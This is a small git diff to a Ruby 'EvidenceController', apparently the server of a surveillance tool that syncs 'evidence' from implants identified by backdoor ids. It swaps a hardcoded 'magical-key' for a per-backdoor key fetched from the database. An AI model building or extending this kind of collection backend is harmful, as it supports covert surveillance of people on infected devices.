@@ -2,6 +2,8 @@
 # Controller for the Evidence objects
 #
 
+require 'rcs-db/db_layer'
+
 require 'rcs-common/evidence_manager'
 
 module RCS
@@ -45,8 +47,8 @@ class EvidenceController < RESTController
                :instance => params['instance'],
                :subtype => params['subtype']}
 
-    #TODO: retrieve the key from the db
-    key = 'magical-key'
+    # retrieve the key from the db
+    key = DB.backdoor_evidence_key(params['bid'])
 
     # store the status
     EvidenceManager.sync_start session, params['version'], params['user'], params['device'], params['source'], params['sync_time'], key
